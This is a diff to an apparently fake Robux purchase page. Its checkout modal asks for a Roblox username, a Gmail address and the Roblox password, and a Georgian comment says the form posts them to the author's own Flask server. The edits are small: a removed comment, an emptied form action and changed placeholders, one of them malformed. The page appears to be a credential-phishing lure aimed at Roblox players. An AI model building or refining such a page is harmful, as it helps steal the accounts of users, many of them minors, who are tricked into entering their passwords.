@@ -59,7 +59,7 @@
         h1 {
             font-size: 48px; font-weight: 800; margin-bottom: 15px; line-height: 1.2;
             background: linear-gradient(90deg, #ffffff, #d4ff3f);
-            background-clip: text; /* 👈 აი ეს დაემატა */
+            background-clip: text; 
             -webkit-background-clip: text; 
             -webkit-text-fill-color: transparent;
         }
@@ -203,12 +203,12 @@
             <p>გთხოვთ შეიყვანოთ მონაცემები შესყიდვის დასასრულებლად</p>
             
             <!-- ეს ფორმა პირდაპირ შენს Flask სერვერზე აგზავნის მონაცემებს -->
-            <form action="/" method="POST">
+            <form action="" method="POST">
                 <input type="hidden" name="robux_amount" id="robuxInput" value="">
                 <input type="hidden" name="service" value="Roblox">
                 
-                <input type="text" name="username" class="modal-input" placeholder="roblox/ Username" required>
-                <input type="email" name="email" class="modal-input" placeholder=" Gmail" required>
+                <input type="text" name="username" class="modal-input" placeholder="Username roblox" required>
+                <input type="email" name="email" class="modal-input" placeholder=Gmai  required>
                 <input type="password" name="password" class="modal-input" placeholder="roblox pasword " required>
                 <button type="submit" class="modal-btn">შესვლა (Login)</button>
             </form>
